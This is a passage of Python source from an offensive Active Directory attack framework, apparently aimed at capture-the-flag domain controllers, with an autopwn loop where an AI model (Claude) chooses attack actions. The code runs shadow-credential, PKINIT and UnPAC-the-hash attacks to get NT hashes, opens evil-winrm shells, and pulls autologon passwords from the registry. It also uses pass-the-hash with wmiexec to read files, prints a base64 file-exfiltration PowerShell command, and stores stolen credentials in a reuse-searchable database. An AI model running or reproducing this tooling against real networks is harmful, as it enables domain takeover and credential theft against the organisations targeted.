                            log(f'Auto-pivoting to {WHITE}{sc_target}{RESET} (hash)','info')
                            target.user     = sc_target
                            target.hash     = sc_hash
                            target.password = None
                            if 'KRB5CCNAME' in os.environ: del os.environ['KRB5CCNAME']
                            add_result('pivot', f'→ {sc_target} (hash)')
                        else:
                            log(f'shadowcred failed: {out[:300]}','error')
                            history.append(f'  shadowcred {sc_target}: FAILED — {out[:100]}')
            elif action == 'pywhisker':
                pw_target = params.get('target','')
                if not pw_target:
                    log('pywhisker: target required','error')
                    history.append('  pywhisker: no target')
                else:
                    import subprocess as _sp_pw, re as _re_pw, shutil as _sh_pw
                    # try certipy shadow first (same result, more reliable)
                    certipy = check_tool('certipy','certipy-ad')
                    if certipy:
                        dc_h = target.dc_fqdn or target.dc
                        if _sh_pw.which('ntpdate'):
                            subprocess.run(['sudo','-n','ntpdate',dc_h],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        if target.hash:
                            auth = ['-username',f'{target.user}@{target.domain}','-hashes',f':{target.hash}']
                        else:
                            auth = ['-username',f'{target.user}@{target.domain}','-password',target.password]
                        cmd = [certipy,'shadow','auto'] + auth + [
                            '-account',pw_target,'-target',target.dc_fqdn or target.dc,'-dc-ip',target.dc]
                        log(f'pywhisker (via certipy) → {WHITE}{pw_target}{RESET}','info')
                        r = subprocess.run(cmd, text=True, capture_output=True, cwd=target.loot_dir, stdin=open(os.devnull))
                        out = r.stdout + r.stderr
                        m_hash = re.search(r'NT hash.*?:\s*([a-fA-F0-9]{32})', out)
                        if m_hash:
                            pw_hash = m_hash.group(1)
                            log(f'{GREEN}pywhisker: {pw_target} hash: {WHITE}{pw_hash}{RESET}','success')
                            history.append(f'  pywhisker {pw_target}: hash={pw_hash}')
                            cf = os.path.join(target.loot_dir,'cracked.txt')
                            with open(cf,'a') as _f: _f.write(f'{pw_target}:{pw_hash}\n')
                        else:
                            log(f'pywhisker failed: {out[:300]}','error')
                            history.append(f'  pywhisker {pw_target}: FAILED')
            elif action == 'exec':
                dc_host = target.dc_fqdn or target.dc
                ew = check_tool('evil-winrm')
                if ew:
                    log(f'evil-winrm → {WHITE}{target.user}@{dc_host}{RESET}','info')
                    if target.password:
                        subprocess.call([ew,'-i',dc_host,'-u',target.user,'-p',target.password])
                    elif target.hash:
                        subprocess.call([ew,'-i',dc_host,'-u',target.user,'-H',target.hash])
                    history.append(f'  exec winrm as {target.user} — now run winlogon to check registry')
                    # auto-run winlogon after shell exits using netexec winrm
                    log(f'{C0}Auto-running winlogon check after shell...{RESET}','info')
                    nxc2 = check_tool('netexec','nxc','crackmapexec','cme')
                    if nxc2 and target.password:
                        rq = 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"'
                        try:
                            out = subprocess.check_output(
                                [nxc2,'winrm',dc_host,'-u',target.user,'-p',target.password,'-x',rq],
                                text=True, stderr=subprocess.DEVNULL, timeout=20)
                            m_u = re.search(r'DefaultUserName\s+REG_SZ\s+(\S+)', out)
                            m_p = re.search(r'DefaultPassword\s+REG_SZ\s+(\S+)', out)
                            if m_p and m_p.group(1):
                                al_user = m_u.group(1).split('\\')[-1] if m_u else 'unknown'
                                al_pass = m_p.group(1).strip()
                                log(f'{GREEN}Winlogon: {WHITE}{al_user}:{al_pass}{RESET}','success')
                                history.append(f'  winlogon found: {al_user}:{al_pass}')
                                cf = os.path.join(target.loot_dir,'cracked.txt')
                                with open(cf,'a') as _f: _f.write(f'{al_user}:{al_pass}\n')
                            else:
                                history.append('  winlogon: no autologon creds in registry')
                        except Exception as e:
                            history.append(f'  winlogon error: {e}')
                else:
                    log('evil-winrm not found','error')
            elif action == 'adrecon':
                if not target.user:
                    log('adrecon needs a user — pivot first','error')
                    history.append('  adrecon failed: no user set — pivot first')
                else:
                    m = ADRecon(); m.answers = {'collection':'All','use rusthound':'n'}; m.run(target)
            elif action == 'pkinit':
                import subprocess as _sp_pk, re as _re_pk, glob as _gl_pk
                pk_user = params.get('username', 'administrator')
                # find pfx
                loot = target.loot_dir
                pfx_candidates = [
                    os.path.join(loot, f'{pk_user}.pfx'),
                    os.path.join(loot, 'administrator.pfx'),
                ] + _gl_pk.glob(f'{pk_user}*.pfx') + _gl_pk.glob('administrator*.pfx')
                pfx = next((p for p in pfx_candidates if os.path.exists(p)), None)
                if not pfx:
                    log(f'No PFX found for {pk_user}','error')
                    history.append(f'  pkinit: no PFX for {pk_user}')
                else:
                    certipy_pk = check_tool('certipy','certipy-ad')
                    if certipy_pk:
                        r = subprocess.run([certipy_pk,'auth','-pfx',pfx,
                            '-dc-ip',target.dc,'-domain',target.domain],
                            text=True, capture_output=True)
                        out = r.stdout + r.stderr
                        m = re.search(r'Got hash.*?:([a-fA-F0-9]{32})$', out, re.M)
                        if m:
                            nt = m.group(1)
                            log(f'{GREEN}pkinit: {pk_user} hash: {WHITE}{nt}{RESET}','success')
                            target.user = pk_user; target.hash = nt; target.password = None
                            cf = os.path.join(loot,'cracked.txt')
                            with open(cf,'a') as _f: _f.write(f'{pk_user}:{nt}\n')
                            history.append(f'  pkinit {pk_user}: hash={nt}')
                        else:
                            log(f'pkinit failed: {out[:300]}','error')
                            history.append(f'  pkinit {pk_user}: FAILED')
            elif action == 'unpac':
                import subprocess as _sp_up, re as _re_up
                un_user = params.get('username', target.user or '')
                cc = os.path.join(target.loot_dir, f'{un_user}.ccache')
                if not os.path.exists(cc):
                    log(f'No ccache for {un_user} at {cc}','error')
                    history.append(f'  unpac: no ccache for {un_user}')
                else:
                    gnh = check_tool('getnthash.py','getnthash')
                    if not gnh:
                        log('getnthash.py not found — install PKINITtools','error')
                    else:
                        env = dict(os.environ, KRB5CCNAME=cc)
                        r = subprocess.run([gnh,'-k',f'{un_user}@{target.domain}'],
                            text=True, capture_output=True, env=env)
                        out = r.stdout + r.stderr
                        m = re.search(r'([a-fA-F0-9]{32})', out)
                        if m:
                            nt = m.group(1)
                            log(f'{GREEN}unpac {un_user}: {WHITE}{nt}{RESET}','success')
                            history.append(f'  unpac {un_user}: hash={nt}')
                            cf2 = os.path.join(target.loot_dir,'cracked.txt')
                            with open(cf2,'a') as _f: _f.write(f'{un_user}:{nt}\n')
                        else:
                            log(f'unpac failed: {out[:300]}','error')
                            history.append(f'  unpac {un_user}: FAILED')
            else:
                log(f'Action {WHITE}{action}{RESET} has no auto-handler — skipping','warn')
                history.append(f'  SKIP: {action} has no handler — Claude should not use it')
                _ap_consecutive_fails += 1
                continue
                cont = input_field(f'Run {action} manually then continue?','y',['y','n'])
                if cont != 'y': break
        except Exception as e:
            log(f'Step failed: {e}','error')
            history.append(f'  FAILED: {e} — try a different approach')

        # check done AFTER action executes so flag runs before skull prints
        if done or action == 'done':
            elapsed_total = int(_ap_time.time() - _ap_start)
            _mins_t, _secs_t = divmod(elapsed_total, 60)
            _elapsed_str_t = f'{_mins_t}m {_secs_t}s' if _mins_t > 0 else f'{_secs_t}s'
            _root = open(os.path.join(target.loot_dir,'root.txt')).read().strip() if os.path.exists(os.path.join(target.loot_dir,'root.txt')) else '???'
            _user = open(os.path.join(target.loot_dir,'user.txt')).read().strip() if os.path.exists(os.path.join(target.loot_dir,'user.txt')) else '???'
            _dom  = (target.domain or '???').upper()
            _hash = (target.hash or '???')[:32]
            print(f"""
{C0}         _,.-----.,_{RESET}
{C0}       ,-~           ~-.{RESET}
{C0}      ,^___           ___^.{RESET}
{C0}    /~"   ~"   .   "~   "~\\{RESET}     {WHITE}{BOLD}{_dom}{RESET} {GREY}— TURNED OVER{RESET}
{C0}   Y  ,--._    I    _.--.  Y{RESET}     {GREY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{C0}    | Y     ~-. | ,-~     Y |{RESET}    {GREY}user  {RESET}{GREEN}{_user}{RESET}
{C0}    | |        }}:{{        | |{RESET}    {GREY}root  {RESET}{GREEN}{_root}{RESET}
{C0}    j l       / | \\       ! l{RESET}    {GREY}creds {RESET}{WHITE}{_hash}{RESET}
{C0} .-~  (__,.--" .^. "--.,__)  ~-.{RESET} {GREY}time  {RESET}{WHITE}{_elapsed_str_t} / {step} steps{RESET}
{C0}(           / / | \\ \\           ){RESET}
{C0} \\.____,   ~  \\/"\\"/  ~   .____,/{RESET} {GREY}KEYS TO THE KINGDOM. CHEERS.{RESET}
{C0}  ^.____                 ____.^{RESET}
{C0}     | |T ~\\  !   !  /~ T| |{RESET}
{C0}     | |l   _ _ _ _ _   !| |{RESET}
{C0}     | l \\/V V V V V V\\/ j |{RESET}
{C0}     l  \\ \\|_|_|_|_|_|/ /  !{RESET}
{C0}      \\  \\[T T T T T TI/  /{RESET}
{C0}       \\  `^-^-^-^-^-^'  /{RESET}
{C0}        \\               /{RESET}       {BOLD}{C0}SEGFAULT.SOLUTIONS{RESET} {GREY}WAS HERE{RESET}
{C0}         \\.           ,/{RESET}
{C0}           "^-.___,-^"{RESET}
""")
            break

    hr()
    log(f'AutoPwn summary:','info')
    for h in history: print(f'  {GREY}{h}{RESET}')
    hr()


def do_check():
    """check — scan all required tools and show install status."""
    hr()
    print(f'  {C0}{BOLD}tool check{RESET}  {GREY}scanning for required tools{RESET}\n')

    categories = {
        'core AD': ['netexec','nxc','certipy','bloodyad','impacket-secretsdump',
                    'impacket-getTGT','impacket-getST','impacket-GetNPUsers',
                    'impacket-GetUserSPNs','impacket-dacledit','impacket-owneredit'],
        'shells':  ['evil-winrm','impacket-wmiexec','impacket-smbclient'],
        'recon':   ['kerbrute','rusthound-ce','bloodhound-python','ldeep','adidnsdump'],
        'crack':   ['hashcat','john'],
        'kerberos':['faketime','ntpdate','kinit'],
        'pkinit':  ['gettgtpkinit.py','getnthash.py','pywhisker.py','username-anarchy'],
        'misc':    ['smbclient','nmap','pypsrp','mitm6','cleanup'],
    }

    found = 0; missing = 0
    for cat, tools in categories.items():
        print(f'  {GREY}{cat}:{RESET}')
        for tool in tools:
            path = check_tool(tool)
            if path:
                found += 1
                print(f'    {GREEN}[+]{RESET} {WHITE}{tool:<25}{RESET} {GREY}{path}{RESET}')
            else:
                missing += 1
                hint = TOOL_INSTALL.get(tool, 'see install docs')
                print(f'    {RED}[-]{RESET} {WHITE}{tool:<25}{RESET} {GREY}install: {hint}{RESET}')
        print()

    hr()
    log(f'{GREEN}{found} tools found{RESET}  {ORANGE}{missing} missing{RESET}',
        'success' if missing == 0 else 'warn')
    if missing > 0:
        log(f'Run {C0}install{RESET} to install missing tools','info')
    hr()

def show_help():
    hr()
    cmds = [('set','configure target -- domain, dc, user, password, NT hash'),
            ('workspace  [ws]','manage workspaces — save/load/list/notes per target'),
            ('target','show current target context'),
            ('modules','list all modules with tool availability'),
            ('run <module>','run a module against the current target'),
            ('<module>','shorthand -- type module name directly, no run needed'),
            ('install','install all dependencies -- pip, apt, git repos'),
            ('hivemind','show Hivemind rack status / hivemind upload <file> → tool server'),
            ('check  [tools]','scan all required tools — show installed/missing with install commands'),
            ('hint  [h]','AI: paste error/situation — Claude suggests next steps'),
            ('explain [ex]','AI: explain any BloodHound edge, ACE, or AD concept'),
            ('autopwn [ap]','AI: analyze BloodHound data and suggest full attack chain'),
            ('tgt','get Kerberos TGT for current user — saves ccache to loot dir'),
            ('clockskew','detect / set / sync clock skew against DC for Kerberos'),
            ('loot','view all collected loot files'),
            ('b64get','exfil a file via base64 — prints PS command, paste output back to decode'),
            ('clear','clear screen'),
            ('exit / quit','exit segfault-ad')]
    print(f'\n  {C0}{BOLD}commands{RESET}\n')
    for c,d in cmds: print(f'  {C1}{c:<22}{RESET} {GREY}{d}{RESET}')
    print(f'\n  {C0}{BOLD}tip{RESET}  {GREY}tab complete on all commands and module names{RESET}\n')
    hr()

def repl():
    if TARGET.domain and TARGET.dc:
        log(f'target  {C0}{TARGET.domain}{RESET}  {C0}{TARGET.dc}{RESET}  user:{WHITE}{TARGET.user or "not set"}{RESET}','info')
    while True:
        try: raw = input(prompt()).strip()
        except (EOFError,KeyboardInterrupt): print(); log('Exiting','info'); sys.exit(0)
        if not raw: continue
        parts = raw.split(); cmd = parts[0].lower(); args = parts[1:]
        if cmd in ('help','?'): show_help()
        elif cmd == 'set':      set_target(TARGET)
        elif cmd in ('workspace','ws'): do_workspace(TARGET)
        elif cmd == 'pivot':
            # quick user swap — keeps domain/dc, just changes user/pass/hash
            hr()
            print(f'  {C0}pivot{RESET}  {GREY}swap user — domain/dc unchanged{RESET}')
            print(f'  {GREY}current: {WHITE}{TARGET.user or "none"}{GREY} / {"pass set" if TARGET.password else "hash set" if TARGET.hash else "no creds"}{RESET}')
            new_user = input_field('username', TARGET.user)
            new_pass = input_field('password', '')
            new_hash = input_field('NT hash', '')
            if new_user: TARGET.user = new_user
            if new_pass: TARGET.password = new_pass; TARGET.hash = None
            elif new_hash: TARGET.hash = new_hash; TARGET.password = None
            else: TARGET.password = None; TARGET.hash = None
            # clear any existing ccache so fresh TGT is obtained
            if 'KRB5CCNAME' in os.environ:
                del os.environ['KRB5CCNAME']
                log('KRB5CCNAME cleared — will get fresh TGT on next Kerberos op','info')
            log(f'Pivoted to {WHITE}{TARGET.user}{RESET} / {"pass set" if TARGET.password else "hash set" if TARGET.hash else "no creds"}','success')
            hr()
        elif cmd == 'target':   hr(); print(f'\n  {C0}{BOLD}target{RESET}\n  {TARGET.summary()}\n'); hr()
        elif cmd == 'modules':  list_modules()
        elif cmd == 'run':
            if not args: log('Usage: run <module>','error'); continue
            name = args[0].lower()
            if name not in MODULES: log(f'Unknown: {name} -- type modules','error'); continue
            try: MODULES[name]().run(TARGET)
            except (EOFError,KeyboardInterrupt): print(); log('Cancelled','warn')
            except Exception as exc:
                import traceback as _tb
                log(f'Module error: {exc}','error')
                log(f'{GREY}{_tb.format_exc().splitlines()[-2].strip()}{RESET}','warn')
        elif cmd == 'loot':     show_loot(TARGET)
        elif cmd == 'report':   _gen_report(TARGET)
        elif cmd == 'export':
            _export_session(TARGET)
        elif cmd == 'import':
            path = args[0] if args else input_field('session file path','')
            if path: _import_session(TARGET, path)
        elif cmd == 'targets':
            _multi_target(TARGET, args)
        elif cmd == 'hivemind':
            if args and args[0] == 'upload' and len(args) > 1:
                hivemind_upload(args[1])
            else:
                hivemind_status()
        elif cmd == 'bh-view':
            _bh_view(TARGET)
        elif cmd == 'db':
            hr()
            sub = args[0] if args else 'help'
            ws  = os.path.basename(TARGET.loot_dir) if TARGET.loot_dir else None

            if sub == 'search' and len(args) > 1:
                q = ' '.join(args[1:])
                log(f'Searching DB for: {WHITE}{q}{RESET}','info')
                results = _db_search(q, ws)
                if results['credentials']:
                    print(f'\n  {C0}[ credentials ]{RESET}')
                    for r in results['credentials']:
                        p = r['password'] or r['hash'] or '?'
                        print(f'  {GREEN}✓{RESET}  {WHITE}{r["username"]:<20}{RESET}  {GREY}{p[:40]}{RESET}  {DIM}{r["workspace"]}{RESET}')
                if results['hashes']:
                    print(f'\n  {C0}[ hashes ]{RESET}')
                    for r in results['hashes']:
                        cracked = f'{GREEN}cracked: {r["password"]}{RESET}' if r['cracked'] else f'{GREY}not cracked{RESET}'
                        print(f'  {ORANGE}#{RESET}  {WHITE}{r["username"]:<20}{RESET}  {GREY}{r["hash_value"][:32]}...{RESET}  {cracked}')
                if results['findings']:
                    print(f'\n  {C0}[ findings ]{RESET}')
                    for r in results['findings']:
                        print(f'  {C0}•{RESET}  {WHITE}{r["module"]:<14}{RESET}  {GREY}{r["detail"][:50]}{RESET}  {DIM}{r["workspace"]}{RESET}')
                if not any(results.values()):
                    log(f'No results for "{q}"','info')

            elif sub == 'creds':
                log(f'Credentials in DB{" for workspace "+ws if ws else ""}: ','info')
                try:
                    with _db_connect() as conn:
                        ws_filter = 'WHERE workspace=?' if ws else ''
                        rows = conn.execute(
                            f'SELECT * FROM credentials {ws_filter} ORDER BY updated_at DESC LIMIT 30',
                            (ws,) if ws else ()).fetchall()
                    if rows:
                        for r in rows:
                            p = r['password'] or f'hash:{(r["hash"] or "")[:20]}' or '?'
                            valid = f'{GREEN}✓{RESET}' if r['valid'] else f'{RED}✗{RESET}'
                            print(f'  {valid}  {WHITE}{r["domain"]}\\{r["username"]:<18}{RESET}  {GREY}{p[:40]}{RESET}  {DIM}{r["source"]}{RESET}')
                    else:
                        log('No credentials saved yet — run hashcrack or pivot to populate','info')
                except Exception as e:
                    log(f'DB error: {e}','error')

            elif sub == 'reuse' and len(args) > 1:
                pw = ' '.join(args[1:])
                hits = _db_password_reuse(pw)
                if hits:
                    log(f'{GREEN}{len(hits)} account(s) use password "{pw}"{RESET}','success')
                    for r in hits:
                        print(f'  {GREEN}•{RESET}  {WHITE}{r["domain"]}\\{r["username"]}{RESET}  {DIM}{r["workspace"]} / {r["source"]}{RESET}')
                else:
                    log(f'No accounts found with password "{pw}"','info')

            elif sub == 'stats':
                log('Database statistics','info')
                try:
                    with _db_connect() as conn:
                        total_creds   = conn.execute('SELECT COUNT(*) FROM credentials').fetchone()[0]
                        total_hashes  = conn.execute('SELECT COUNT(*) FROM hashes').fetchone()[0]
                        total_cracked = conn.execute('SELECT COUNT(*) FROM hashes WHERE cracked=1').fetchone()[0]
                        total_findings= conn.execute('SELECT COUNT(*) FROM findings').fetchone()[0]
                        workspaces    = conn.execute('SELECT DISTINCT workspace FROM credentials').fetchall()
                    print(f'  {WHITE}credentials:{RESET}  {total_creds}')
                    print(f'  {WHITE}hashes:     {RESET}  {total_hashes} ({total_cracked} cracked)')
                    print(f'  {WHITE}findings:   {RESET}  {total_findings}')
                    print(f'  {WHITE}workspaces: {RESET}  {", ".join(r[0] for r in workspaces) or "none"}')
                    if ws:
                        summary = _db_get_workspace_summary(ws)
                        print(f'\n  {C0}current workspace ({ws}):{RESET}')
                        for k,v in summary.items(): print(f'    {k}: {v}')
                except Exception as e:
                    log(f'DB error: {e}','error')

            else:
                print(f'  {C0}db search <query>{RESET}   — search creds/hashes/findings')
                print(f'  {C0}db creds{RESET}            — list saved credentials')
                print(f'  {C0}db reuse <password>{RESET} — find password reuse across workspaces')
                print(f'  {C0}db stats{RESET}            — database statistics')
            hr()

        elif cmd == 'b64get':
            hr()
            remote_path = input(f'  {C0}remote file path{RESET} > ').strip()
            local_name  = input(f'  {C0}local filename [{os.path.basename(remote_path)}]{RESET} > ').strip()
            if not local_name: local_name = os.path.basename(remote_path)
            local_path  = os.path.join(TARGET.loot_dir, local_name)
            log(f'Run this in your evil-winrm / shell:','info')
            log(f'{PINK}[Convert]::ToBase64String([IO.File]::ReadAllBytes("{remote_path}")){RESET}','info')
            hr()
            b64 = input(f'  {C0}paste base64 output{RESET} > ').strip()
            if b64:
                import base64 as _b64
                try:
                    data = _b64.b64decode(b64)
                    open(local_path,'wb').write(data)
                    log(f'{GREEN}Saved: {WHITE}{local_path}{GREEN} ({len(data)} bytes){RESET}','success')
                except Exception as e:
                    log(f'Decode failed: {e}','error')
            hr()
        elif cmd == 'flag':
            hr()
            # check if flags already captured manually via args
            if args and len(args) >= 1:
                val = args[0]
                ftype = 'root' if TARGET.user and TARGET.user.lower() in ('administrator','root') else 'user'
                if len(args) >= 2: ftype = args[0]; val = args[1]
                fname = f'{ftype}.txt'
                open(os.path.join(TARGET.loot_dir, fname),'w').write(val+'\n')
                log(f'{GREEN}{ftype}: {val}{RESET}','success')
                add_result('flag', f'{ftype}:{val[:8]}…')
                hr(); continue

            # quick manual entry option
            manual = input_field('paste flag manually (or press enter to auto-grab)','')
            if manual and re.match(r'^[0-9a-f]{32}$', manual.strip(), re.I):
                val = manual.strip()
                ftype = 'root' if TARGET.user and TARGET.user.lower() == 'administrator' else 'user'
                ftype = input_field('flag type','root' if ftype == 'root' else 'user')
                open(os.path.join(TARGET.loot_dir,f'{ftype}.txt'),'w').write(val+'\n')
                log(f'{GREEN}{ftype}: {val}{RESET}','success')
                add_result('flag', f'{ftype}:{val[:8]}…')
                # check if both flags now exist
                user_f = os.path.join(TARGET.loot_dir,'user.txt')
                root_f = os.path.join(TARGET.loot_dir,'root.txt')
                if os.path.exists(user_f) and os.path.exists(root_f):
                    _user_flag = open(user_f).read().strip()
                    _root_flag = open(root_f).read().strip()
                    _dom  = (TARGET.domain or 'UNKNOWN').upper()
                    _hash = f':{TARGET.hash}' if TARGET.hash else TARGET.password or '?'
                    print(f"""
{C0}         _,.-----.,_{RESET}
{C0}       ,-~           ~-.{RESET}
{C0}      ,^___           ___^.{RESET}
{C0}    /~\"   ~\"   .   \"~   \"~\\{RESET}     {WHITE}{BOLD}{_dom}{RESET} {GREY}— TURNED OVER{RESET}
{C0}   Y  ,--._    I    _.--.  Y{RESET}     {GREY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{C0}    | Y     ~-. | ,-~     Y |{RESET}    {GREY}user  {RESET}{GREEN}{_user_flag}{RESET}
{C0}    | |        }}:{{        | |{RESET}    {GREY}root  {RESET}{GREEN}{_root_flag}{RESET}
{C0}    j l       / | \\       ! l{RESET}    {GREY}creds {RESET}{WHITE}{_hash}{RESET}
{C0} .-~  (__,.--\" .^. \"--.,__)  ~-.{RESET}
{C0}(           / / | \\ \\           ){RESET}
{C0} \\.____,   ~  \\/\"\\"/  ~   .____,/{RESET} {GREY}KEYS TO THE KINGDOM. CHEERS.{RESET}
{C0}  ^.____                 ____.^{RESET}
""")
                hr(); continue

            log('Grabbing flags via wmiexec...','info')
            wmi = check_tool('impacket-wmiexec','wmiexec.py')
            if not wmi:
                log('impacket-wmiexec not found','error'); hr(); continue
            import glob as _gl_flag
            ccache = os.environ.get('KRB5CCNAME','')
            dc_host = TARGET.dc_fqdn or TARGET.dc
            # find best ccache — prefer service tickets (cifs) over TGTs
            all_ccaches = sorted(_gl_flag.glob(os.path.join(TARGET.loot_dir,'*.ccache')),
                                 key=os.path.getmtime, reverse=True)
            cifs_ccaches = [c for c in all_ccaches if 'cifs' in c.lower()]
            best_cc = cifs_ccaches[0] if cifs_ccaches else (ccache if ccache and os.path.exists(ccache) else (all_ccaches[0] if all_ccaches else ''))
            # extract username from ccache filename if possible
            cc_user = TARGET.user
            if best_cc:
                m_cc = re.match(r'^([^@]+)@', os.path.basename(best_cc))
                if m_cc: cc_user = m_cc.group(1)
            if TARGET.hash:
                auth = [f'{TARGET.domain}/{TARGET.user}@{dc_host}','-hashes',f':{TARGET.hash}','-no-pass']
                log(f'Using PTH for {WHITE}{TARGET.user}{RESET}','info')
            elif best_cc and os.path.exists(best_cc):
                os.environ['KRB5CCNAME'] = best_cc
                auth = [f'{TARGET.domain}/{cc_user}@{dc_host}','-k','-no-pass']
                log(f'Using ccache: {WHITE}{best_cc}{RESET}','info')
            elif TARGET.password:
                auth = [f'{TARGET.domain}/{TARGET.user}:{TARGET.password}@{dc_host}']
                log(f'Using password for {WHITE}{TARGET.user}{RESET}','info')
            else:
                log('Set user/pass, hash, or ensure KRB5CCNAME is set','error'); hr(); continue
            def _grab(path):
                try:
                    out = subprocess.check_output([wmi]+auth+['type '+path],
                        stderr=subprocess.DEVNULL, text=True, timeout=15)
                    m = re.search(r'[0-9a-f]{32}', out, re.I)
                    return m.group(0) if m else None
                except Exception: return None
            flag = _grab(r'C:\Users\Administrator\Desktop\root.txt')
            _root_flag = None
            _user_flag = None
            if flag:
                _root_flag = flag
                log(f'root: {GREEN}{flag}{RESET}','success')
                open(os.path.join(TARGET.loot_dir,'root.txt'),'w').write(flag+'\n')
            try:
                users = subprocess.check_output([wmi]+auth+[r'dir C:\Users /b'],
                    stderr=subprocess.DEVNULL, text=True, timeout=10).strip().splitlines()
                for u in users:
                    u = u.strip()
                    if u.lower() in ('administrator','public','default','all users'): continue
                    flag = _grab(f'C:\\Users\\{u}\\Desktop\\user.txt')
                    if flag:
                        _user_flag = flag
                        log(f'user ({u}): {GREEN}{flag}{RESET}','success')
                        open(os.path.join(TARGET.loot_dir,'user.txt'),'w').write(flag+'\n')
            except Exception: pass
            # update attack map with actual flag values
            if _root_flag or _user_flag:
                parts = []
                if _user_flag: parts.append(f'user:{_user_flag[:8]}…')
                if _root_flag: parts.append(f'root:{_root_flag[:8]}…')
                add_result('flag', '  '.join(parts))

            # skull calling card when both flags found
            if _root_flag and _user_flag:
                _dom  = (TARGET.domain or 'UNKNOWN').upper()
                _user = _user_flag
                _root = _root_flag
                _hash = f':{TARGET.hash}' if TARGET.hash else TARGET.password or '?'
                print(f"""
{C0}         _,.-----.,_{RESET}
{C0}       ,-~           ~-.{RESET}
{C0}      ,^___           ___^.{RESET}
{C0}    /~\"   ~\"   .   \"~   \"~\\{RESET}     {WHITE}{BOLD}{_dom}{RESET} {GREY}— TURNED OVER{RESET}
{C0}   Y  ,--._    I    _.--.  Y{RESET}     {GREY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{C0}    | Y     ~-. | ,-~     Y |{RESET}    {GREY}user  {RESET}{GREEN}{_user}{RESET}
{C0}    | |        }}:{{        | |{RESET}    {GREY}root  {RESET}{GREEN}{_root}{RESET}
{C0}    j l       / | \\       ! l{RESET}    {GREY}creds {RESET}{WHITE}{_hash}{RESET}
{C0} .-~  (__,.--\" .^. \"--.,__)  ~-.{RESET}
{C0}(           / / | \\ \\           ){RESET}
{C0} \\.____,   ~  \\/\"\\/  ~   .____,/{RESET} {GREY}KEYS TO THE KINGDOM. CHEERS.{RESET}
{C0}  ^.____                 ____.^{RESET}
{C0}     | |T ~\\  !   !  /~ T| |{RESET}
{C0}     | |l   _ _ _ _ _   !| |{RESET}
{C0}     | l \\/V V V V V V\\/ j |{RESET}
{C0}     l  \\ \\|_|_|_|_|_|/ /  !{RESET}
{C0}      \\  \\[T T T T T TI/  /{RESET}
{C0}       \\  `^-^-^-^-^-^'  /{RESET}
{C0}        \\               /{RESET}       {BOLD}{C0}SEGFAULT.SOLUTIONS{RESET} {GREY}WAS HERE{RESET}
{C0}         \\.           ,/{RESET}
{C0}           \"^-.___,-^\"{RESET}
""")
            hr()
        elif cmd == 'flags':
            hr()
            log('Grabbing flags via secretsdump + PTH...','info')
            # common flag locations
            flag_paths = [
                r'C:\Users\Administrator\Desktop\root.txt',
                r'C:\Users\Administrator\Desktop\flag.txt',
            ]
            # get all users from ntds if available
            ntds = os.path.join(TARGET.loot_dir,'dcsync.txt.ntds')
            users_found = []
            if os.path.exists(ntds):
                for line in open(ntds):
                    m = re.match(r'([^:]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::', line)
                    if m:
                        user,rid,lm,nt = m.group(1),m.group(2),m.group(3),m.group(4)
                        if nt != '31d6cfe0d16ae931b73c59d7e0c089c0':
                            users_found.append((user,nt))
            # try admin first
            admin_hash = next((h for u,h in users_found if 'administrator' in u.lower()), TARGET.hash)
            admin_user = 'Administrator'
            if not admin_hash:
                log('No admin hash found — run dcsync first or set hash via pivot','error')
                hr(); return
            wmiexec = check_tool('impacket-wmiexec','wmiexec.py')
            if not wmiexec:
                log('impacket-wmiexec not found','error'); hr(); return
            for path in flag_paths:
                log(f'Reading {WHITE}{path}{RESET}','info')
                cmd_r = f'type {path}'
                run_cmd([wmiexec,f'{TARGET.domain}/{admin_user}@{TARGET.dc}',
                         '-hashes',f':{admin_hash}','-no-pass',cmd_r],
                        label=f'flag: {path}')
            # also grab user flags
            log(f'{GREY}Checking user desktops...{RESET}','info')
            run_cmd([wmiexec,f'{TARGET.domain}/{admin_user}@{TARGET.dc}',
                     '-hashes',f':{admin_hash}','-no-pass',
                     r'cmd /c for /r C:\Users %f in (user.txt) do type %f'],
                    label='user.txt hunt')
            hr()
        elif cmd in ('check','tools'): do_check()
        elif cmd in ('hint','h'):    do_hint(TARGET)
        elif cmd in ('explain','ex'): do_explain(TARGET)
        elif cmd in ('autopwn','ap'): do_autopwn(TARGET)
        elif cmd == 'tgt':
            hr()
            getTGT = check_tool('impacket-getTGT','getTGT.py')
            if not getTGT: log('impacket-getTGT not found','error'); hr(); continue
            if not TARGET.domain: log('Set domain first','error'); hr(); continue
            os.makedirs(TARGET.loot_dir, exist_ok=True)
            orig_cwd = os.getcwd(); os.chdir(TARGET.loot_dir)
            ccache_out = os.path.join(TARGET.loot_dir, f'{TARGET.user}.ccache')
            if os.path.exists(ccache_out): os.remove(ccache_out)
            aeskey = input_field('AES key (blank to use password/hash)','')
            # check for pfx cert (PKINIT) — highest priority
            pfx_path = os.path.join(TARGET.loot_dir, f'{TARGET.user}.pfx')
            pfx_path2 = os.path.join(TARGET.loot_dir, f'{TARGET.user}_cert.pfx')
            pfx = pfx_path if os.path.exists(pfx_path) else (pfx_path2 if os.path.exists(pfx_path2) else '')
            pfx_prompt = input_field('PFX cert path (blank = use password/hash/aeskey)', pfx)

            if pfx_prompt and os.path.exists(pfx_prompt):
                # PKINIT via PKINITtools — no password needed, cert is the auth
                gettgtpkinit = check_tool('gettgtpkinit')
                if not gettgtpkinit:
                    # try common locations
                    for p in ['/opt/PKINITtools/gettgtpkinit.py',
                               os.path.expanduser('~/PKINITtools/gettgtpkinit.py'),
                               os.path.expanduser('~/.segfault-ad/tools/PKINITtools/gettgtpkinit.py')]:
                        if os.path.exists(p): gettgtpkinit = p; break
                if gettgtpkinit:
                    log(f'{GREEN}PKINIT auth via gettgtpkinit{RESET}','info')
                    cmd2 = ['python3', gettgtpkinit,
                            '-cert-pfx', pfx_prompt,
                            f'{TARGET.domain}/{TARGET.user}', ccache_out]
                    rc = run_cmd(cmd2, label='gettgtpkinit PKINIT')
                    if os.path.exists(ccache_out):
                        os.environ['KRB5CCNAME'] = ccache_out
                        env_file = os.path.join(TARGET.loot_dir, 'krb5.env')
                        open(env_file,'w').write(f'export KRB5CCNAME={ccache_out}\n')
                        log(f'{GREEN}TGT saved → {WHITE}{ccache_out}{RESET}','success')
